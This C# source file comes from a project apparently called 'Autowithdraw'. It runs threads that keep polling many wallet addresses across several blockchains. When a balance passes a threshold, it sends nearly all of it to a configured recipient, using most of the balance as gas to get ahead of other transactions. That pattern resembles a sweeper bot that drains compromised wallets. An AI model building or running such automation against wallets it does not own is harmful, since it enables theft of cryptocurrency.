using System;
using System.Collections.Generic;
using Autowithdraw.Global;
using Autowithdraw.Main.Actions;
using System.Linq;
using System.Numerics;
using System.Threading;
using System.Threading.Tasks;
using Nethereum.Web3;

namespace Autowithdraw.Main.Handlers
{
    internal class Balance
    {
        public static bool Stop = false;

        public static Task Starter(string[] Wallets)
        {
            Console.WriteLine(Wallets.Length);
            foreach (string[] Addresses in Helper.Chunk(Wallets, 30).ToArray())
            {
                new Thread(async () => await _Starter(Addresses)).Start();
            }

            return Task.CompletedTask;
        }

        public static async Task _Starter(string[] Addresses)
        {
            while (!Stop)
            {
                foreach (string Address in Addresses)
                {
                    if (Stop)
                        break;
                    foreach (int ChainID in Settings.Chains.Keys)
                    {
                        if (Settings.Chains[ChainID].API == "None")
                            continue;
                        //Console.WriteLine(Address + " " + ChainID);
                        try
                        {
                            BigInteger BalanceWei =
                                await Settings.Chains[ChainID].Web3.Eth.GetBalance.SendRequestAsync(Address);

                            if (BalanceWei > 100000000000000)
                            {
                                BigInteger GasPrice = (BalanceWei - Helper.GetWei(true)) /
                                                      Settings.Chains[ChainID].DefaultGas;

                                if (GasPrice >= await Pricing.GetGwei(ChainID) && Address != Settings.Config.Recipient)
                                {
                                    await Task.Factory.StartNew(() =>
                                        Transfer.Native(Address, BalanceWei, ChainID, CheckedBalance: true));
                                }
                            }
                        }
                        catch
                        {
                            // ignored
                        }
                    }
                }
            }
        }

        public static async Task Check(string Address)
        {
            foreach (int ChainID in Settings.Chains.Keys)
            {
                if (Settings.Chains[ChainID].API == "None")
                    continue;
                try
                {
                    BigInteger BalanceWei =
                        await Settings.Chains[ChainID].Web3.Eth.GetBalance.SendRequestAsync(Address);

                    if (BalanceWei > 100000000000000)
                    {
                        BigInteger GasPrice = (BalanceWei - Helper.GetWei(true)) /
                                              Settings.Chains[ChainID].DefaultGas;

                        if (GasPrice >= await Pricing.GetGwei(ChainID) && Address != Settings.Config.Recipient)
                        {
                            await Task.Factory.StartNew(() =>
                                Transfer.Native(Address, BalanceWei, ChainID, CheckedBalance: true));
                        }
                    }
                }
                catch
                {
                    // ignored
                }
            }
        }
    }
}
